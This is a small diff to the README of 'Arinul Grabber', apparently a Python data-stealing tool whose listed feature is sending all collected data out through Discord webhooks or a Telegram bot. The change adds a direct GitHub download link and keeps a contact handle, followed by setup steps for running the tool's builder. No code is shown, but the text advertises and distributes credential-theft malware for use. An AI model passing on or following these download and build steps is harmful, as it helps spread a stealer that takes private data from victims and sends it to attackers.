@@ -40,7 +40,7 @@ Features;
 • Sends All Data Through Discord Webhooks/Telegram Bot.
 
 How to download;
-go to github or message arinul?#6883
+go to my official github; "https://github.com/arinulee/Arinul-Grabber" or message arinul?#6883
 Download Arinul Grabber
 make sure you have python 3.10+ and that its added to path.
 open Builder.bat
